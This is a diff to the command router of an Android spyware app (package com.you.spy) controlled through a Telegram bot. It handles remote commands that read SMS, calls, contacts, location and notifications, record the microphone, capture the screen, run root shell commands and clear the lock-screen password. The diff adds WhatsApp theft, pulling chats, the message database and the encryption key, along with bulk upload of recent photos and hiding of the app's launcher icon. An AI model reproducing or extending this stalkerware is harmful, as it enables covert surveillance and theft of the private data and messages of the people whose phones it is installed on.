@@ -2,12 +2,13 @@ package com.you.spy.service
 
 import android.app.admin.DevicePolicyManager
 import android.content.ClipboardManager
+import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.hardware.camera2.CameraManager
 import android.media.AudioManager
 import android.net.Uri
-import android.net.wifi.WifiManager
 import android.os.BatteryManager
 import android.os.Build
 import android.os.PowerManager
@@ -18,14 +19,15 @@ import com.you.spy.collect.Capture
 import com.you.spy.collect.Collectors
 import com.you.spy.collect.FileOps
 import com.you.spy.collect.Location
+import com.you.spy.collect.WaCollect
 import com.you.spy.net.TgApi
 import com.you.spy.receiver.AdminReceiver
 import com.you.spy.shell.Shell
 import com.you.spy.util.Config
 import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.delay
 import kotlinx.coroutines.withContext
 import org.json.JSONObject
-import java.io.File
 
 object CommandRouter {
 
@@ -33,16 +35,26 @@ object CommandRouter {
 <b>Commands</b>
 <pre>
 /status  /battery  /wifi  /net  /loc  /find
-/sms n  /calls n  /contacts  /apps  /notif n
-/photo f|b  /mic sec  /screen  /dump
-/ls path  /get path  /rm path  /put (reply)
+/sms n  /calls n  /contacts  /apps  /notif n  /dump
+/photo f|b  /mic sec  /screen
+/ls path  /get path  /last n [dir]  /put (reply)  /rm path
 /tap x y  /swipe x1 y1 x2 y2  /type txt  /click txt
 /clip  /toast t  /open pkg  /url u  /vol 0-15  /bright 0-255
 /ring  /vibrate  /lock  /unlock  /flash on|off
-/sh cmd  /shell root|shizuku|auto  /grant perm
-/reboot  /gps  /data on|off  /airplane
+/wa notif|chat|media|voice|docs|db|contacts|key
+/sh cmd  /shell root|shizuku|auto  /grant perm  /revoke perm
+/gps  /data on|off  /airplane  /reboot
+/hide  /show
 </pre>
 """
+
+    private val ALIAS = mapOf(
+        "camera" to "DCIM/Camera",
+        "dcim" to "DCIM",
+        "screenshots" to "Pictures/Screenshots",
+        "downloads" to "Download",
+        "whatsapp" to "Android/media/com.whatsapp/WhatsApp/Media"
+    )
 
     suspend fun handle(ctx: Context, update: JSONObject): Unit = withContext(Dispatchers.IO) {
         val msg = update.optJSONObject("message") ?: return@withContext
@@ -52,7 +64,7 @@ object CommandRouter {
             if (msg.has("document")) "/put" else return@withContext
         }
 
-        // ---- auth ----
+        // ---------- auth ----------
         if (Config.chat.isEmpty()) {
             val code = Config.code
             if (code.isNotEmpty() && raw.contains(code)) {
@@ -65,7 +77,15 @@ object CommandRouter {
         }
         if (chatId != Config.chat) return@withContext
 
-        val parts = raw.trim().split(Regex("\\s+"), limit = 2)
+        // ---------- bare path shortcuts ----------
+        val cleaned = raw.trim()
+        val raw2 = if (!cleaned.startsWith("/") && ALIAS.containsKey(cleaned.lowercase())) {
+            "/ls ${ALIAS[cleaned.lowercase()]}"
+        } else {
+            cleaned
+        }
+
+        val parts = raw2.split(Regex("\\s+"), limit = 2)
         val cmd = parts[0].lowercase().removePrefix("/").substringBefore("@")
         val arg = parts.getOrNull(1)?.trim().orEmpty()
 
@@ -81,7 +101,7 @@ object CommandRouter {
             "ping" -> TgApi.send("pong ${System.currentTimeMillis()}")
 
             "status" -> {
-                val pm = PowerManager::class.java.let { ctx.getSystemService(it) }
+                val pm = ctx.getSystemService(PowerManager::class.java)
                 TgApi.send(buildString {
                     appendLine("<b>${Build.MANUFACTURER} ${Build.MODEL}</b>")
                     appendLine("android ${Build.VERSION.RELEASE} (sdk ${Build.VERSION.SDK_INT})")
@@ -89,28 +109,28 @@ object CommandRouter {
                     appendLine("shell: ${Shell.mode()}")
                     appendLine("accessibility: ${SpyAccessibilityService.instance != null}")
                     appendLine("notif: ${SpyNotificationListener.instance != null}")
-                    appendLine("screen: ${Capture.let { "" }}${if (pm.isInteractive) "on" else "off"}")
+                    appendLine("screen: ${if (pm.isInteractive) "on" else "off"}")
                 })
             }
 
             "battery" -> TgApi.send("${pct(ctx)}%  charging=${isCharging(ctx)}")
 
             "wifi" -> TgApi.send(
-                Shell.exec("dumpsys wifi | grep -E 'SSID|mWifiInfo' | head -5")
+                "<pre>${esc(Shell.exec("dumpsys wifi | grep -E 'SSID|mWifiInfo' | head -5"))}</pre>"
             )
 
-            "net" -> TgApi.send(Shell.exec("ip -o addr show | head -20"))
+            "net" -> TgApi.send("<pre>${esc(Shell.exec("ip -o addr show | head -20"))}</pre>")
 
-            "loc" -> {
-                val s = Location.best(ctx)
-                TgApi.send("<pre>${esc(s)}</pre>")
-            }
+            "loc" -> TgApi.send("<pre>${esc(Location.best(ctx))}</pre>")
 
             "find" -> {
                 val s = Location.best(ctx)
                 val m = Regex("(-?\\d+\\.\\d+), (-?\\d+\\.\\d+)").find(s)
                 if (m != null) {
-                    TgApi.send("<a href=\"${Location.mapLink(m.groupValues[1].toDouble(), m.groupValues[2].toDouble())}\">map</a>\n<pre>${esc(s)}</pre>")
+                    TgApi.send(
+                        "<a href=\"${Location.mapLink(m.groupValues[1].toDouble(), m.groupValues[2].toDouble())}\">map</a>\n" +
+                        "<pre>${esc(s)}</pre>"
+                    )
                 } else TgApi.send("<pre>${esc(s)}</pre>")
             }
 
@@ -134,8 +154,9 @@ object CommandRouter {
             }
 
             "mic" -> {
-                TgApi.send("recording ${arg.ifEmpty { "10" }}s")
-                val f = Capture.record(ctx, arg.toIntOrNull() ?: 10)
+                val sec = arg.toIntOrNull() ?: 10
+                TgApi.send("recording ${sec}s")
+                val f = Capture.record(ctx, sec)
                 if (f == null) TgApi.send("mic failed")
                 else {
                     TgApi.sendFile(f, false)
@@ -144,9 +165,13 @@ object CommandRouter {
             }
 
             "screen" -> {
+                if (!Capture.hasProjection()) {
+                    TgApi.send("pehle dashboard se Screen capture consent do")
+                    return
+                }
                 TgApi.typing("upload_photo")
                 val b = Capture.screen(ctx)
-                if (b == null) TgApi.send("start ScreenCaptureActivity first")
+                if (b == null) TgApi.send("capture failed")
                 else TgApi.sendBytes(b, "screen.jpg", true)
             }
 
@@ -155,10 +180,22 @@ object CommandRouter {
             "get" -> {
                 val f = FileOps.file(arg)
                 if (f == null) TgApi.send("not a file: $arg")
-                else if (f.length() > 49_000_000L) TgApi.send("too big (${f.length()} bytes, limit 50MB)")
                 else {
                     TgApi.typing("upload_document")
-                    TgApi.sendFile(f, f.name.endsWith(".jpg") || f.name.endsWith(".png"), f.name)
+                    TgApi.send("<pre>${esc(FileOps.send(f))}</pre>")
+                }
+            }
+
+            "last" -> {
+                val sp = arg.split(" ", limit = 2)
+                val n = sp[0].toIntOrNull() ?: 5
+                val path = sp.getOrElse(1) { "DCIM/Camera" }
+                val files = FileOps.newest(path, n)
+                if (files.isEmpty()) TgApi.send("kuch nahi mila: $path")
+                else files.forEach { f ->
+                    TgApi.typing("upload_document")
+                    TgApi.send("<pre>${esc(FileOps.send(f))}</pre>")
+                    delay(800)
                 }
             }
 
@@ -166,7 +203,7 @@ object CommandRouter {
                 val doc = msg.optJSONObject("document")
                 if (doc == null) { TgApi.send("reply to a file with /put"); return }
                 val name = doc.optString("file_name", "in_${System.currentTimeMillis()}")
-                val dest = File(ctx.filesDir, name)
+                val dest = java.io.File(ctx.filesDir, name)
                 val ok = TgApi.download(doc.optString("file_id"), dest) != null
                 TgApi.send(if (ok) "saved ${dest.absolutePath} (${dest.length()} bytes)" else "download failed")
             }
@@ -217,8 +254,9 @@ object CommandRouter {
             }
 
             "url" -> {
-                ctx.startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(arg))
-                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
+                ctx.startActivity(
+                    Intent(Intent.ACTION_VIEW, Uri.parse(arg)).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                )
                 TgApi.send("opened")
             }
 
@@ -239,27 +277,28 @@ object CommandRouter {
             "ring" -> {
                 val am = ctx.getSystemService(Context.AUDIO_SERVICE) as AudioManager
                 am.setRingerMode(AudioManager.RINGER_MODE_NORMAL)
-                am.setStreamVolume(AudioManager.STREAM_RING, am.getStreamMaxVolume(AudioManager.STREAM_RING), 0)
+                am.setStreamVolume(
+                    AudioManager.STREAM_RING, am.getStreamMaxVolume(AudioManager.STREAM_RING), 0
+                )
                 TgApi.send("ringing")
             }
 
             "vibrate" -> {
                 val v = ctx.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
-                val ms = arg.toLongOrNull() ?: 800
-                v.vibrate(VibrationEffect.createOneShot(ms, VibrationEffect.DEFAULT_AMPLITUDE))
+                v.vibrate(VibrationEffect.createOneShot(arg.toLongOrNull() ?: 800, VibrationEffect.DEFAULT_AMPLITUDE))
                 TgApi.send("vibrated")
             }
 
             "lock" -> {
                 val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
-                val admin = android.content.ComponentName(ctx, AdminReceiver::class.java)
+                val admin = ComponentName(ctx, AdminReceiver::class.java)
                 if (dpm.isAdminActive(admin)) { dpm.lockNow(); TgApi.send("locked") }
                 else TgApi.send("admin not active")
             }
 
             "unlock" -> {
                 val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
-                val admin = android.content.ComponentName(ctx, AdminReceiver::class.java)
+                val admin = ComponentName(ctx, AdminReceiver::class.java)
                 if (dpm.isAdminActive(admin)) {
                     dpm.resetPassword("", 0)
                     TgApi.send("password cleared")
@@ -274,6 +313,54 @@ object CommandRouter {
                 TgApi.send("flash ${if (arg.equals("on", true)) "on" else "off"}")
             }
 
+            "wa" -> {
+                val sp = arg.split(" ", limit = 2)
+                val sub = sp[0].lowercase()
+                val rest = sp.getOrElse(1) { "" }
+
+                when (sub) {
+                    "notif" -> chunk(
+                        SpyNotificationListener.recentFrom("com.whatsapp", rest.toIntOrNull() ?: 20)
+                    )
+
+                    "chat" -> {
+                        TgApi.typing()
+                        chunk(WaCollect.openChat(ctx, rest))
+                    }
+
+                    "db" -> {
+                        TgApi.send("db pull kar raha hoon...")
+                        TgApi.typing("upload_document")
+                        TgApi.send("<pre>${esc(WaCollect.pullDb(ctx, "msgstore.db"))}</pre>")
+                    }
+
+                    "contacts" -> {
+                        TgApi.typing("upload_document")
+                        TgApi.send("<pre>${esc(WaCollect.pullContacts(ctx))}</pre>")
+                    }
+
+                    "key" -> TgApi.send(WaCollect.pullKey())
+
+                    "media", "video", "voice", "audio", "docs", "gif" -> {
+                        val dir = WaCollect.dir(sub) ?: return
+                        val n = rest.toIntOrNull() ?: 5
+                        val files = FileOps.newest(dir, n)
+                        if (files.isEmpty()) TgApi.send("khaali: $dir")
+                        else files.forEach { f ->
+                            TgApi.typing("upload_document")
+                            TgApi.send("<pre>${esc(FileOps.send(f))}</pre>")
+                            delay(800)
+                        }
+                    }
+
+                    else -> TgApi.send(
+                        "<pre>/wa notif [n]\n/wa chat 91XXXXXXXXXX\n" +
+                        "/wa media [n]  /wa voice [n]  /wa docs [n]\n" +
+                        "/wa db  /wa contacts  /wa key  (root)</pre>"
+                    )
+                }
+            }
+
             "shell" -> {
                 Config.shellMode = arg.ifEmpty { "auto" }
                 TgApi.send("shell mode: ${Shell.mode()}")
@@ -284,32 +371,48 @@ object CommandRouter {
                 TgApi.send("<pre>${esc(Shell.exec(arg))}</pre>")
             }
 
-            "grant" -> TgApi.send("<pre>${esc(Shell.exec("pm grant com.you.spy $arg"))}</pre>")
+            "grant" -> TgApi.send("<pre>${esc(Shell.exec("pm grant ${ctx.packageName} $arg"))}</pre>")
 
-            "revoke" -> TgApi.send("<pre>${esc(Shell.exec("pm revoke com.you.spy $arg"))}</pre>")
+            "revoke" -> TgApi.send("<pre>${esc(Shell.exec("pm revoke ${ctx.packageName} $arg"))}</pre>")
 
             "gps" -> {
-                val v = if (arg.equals("on", true)) "1" else "0"
-                val r = Shell.exec("settings put secure location_mode ${if (v == "1") 3 else 0}")
-                TgApi.send("gps -> $v\n$r")
+                val mode = if (arg.equals("on", true)) 3 else 0
+                TgApi.send("<pre>${esc(Shell.exec("settings put secure location_mode $mode"))}</pre>")
             }
 
             "data" -> {
-                val on = arg.equals("on", true)
-                val r = Shell.exec(if (on) "svc data enable" else "svc data disable")
-                TgApi.send("data $arg\n$r")
+                val r = Shell.exec(if (arg.equals("on", true)) "svc data enable" else "svc data disable")
+                TgApi.send("<pre>${esc(r)}</pre>")
             }
 
             "airplane" -> {
                 val r = Shell.exec(
                     "cmd connectivity airplane-mode ${if (arg.equals("on", true)) "enable" else "disable"}"
                 )
-                TgApi.send(r)
+                TgApi.send("<pre>${esc(r)}</pre>")
             }
 
             "reboot" -> {
                 TgApi.send("rebooting")
                 Shell.exec(if (arg == "recovery") "reboot recovery" else "reboot")
+            }
+
+            "hide" -> {
+                ctx.packageManager.setComponentEnabledSetting(
+                    ComponentName(ctx, "${ctx.packageName}.ui.Launcher"),
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    PackageManager.DONT_KILL_APP
+                )
+                TgApi.send("🙈 icon hidden. wapas: /show")
+            }
+
+            "show" -> {
+                ctx.packageManager.setComponentEnabledSetting(
+                    ComponentName(ctx, "${ctx.packageName}.ui.Launcher"),
+                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                    PackageManager.DONT_KILL_APP
+                )
+                TgApi.send("👁 icon wapas")
             }
 
             else -> TgApi.send("unknown: /$cmd — /help")
@@ -323,13 +426,10 @@ object CommandRouter {
 
     private fun esc(s: String) = s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
 
-    private fun pct(ctx: Context): Int {
-        val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
-        return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
-    }
+    private fun pct(ctx: Context): Int =
+        (ctx.getSystemService(Context.BATTERY_SERVICE) as BatteryManager)
+            .getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
 
-    private fun isCharging(ctx: Context): Boolean {
-        val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
-        return bm.isCharging
-    }
+    private fun isCharging(ctx: Context): Boolean =
+        (ctx.getSystemService(Context.BATTERY_SERVICE) as BatteryManager).isCharging
 }
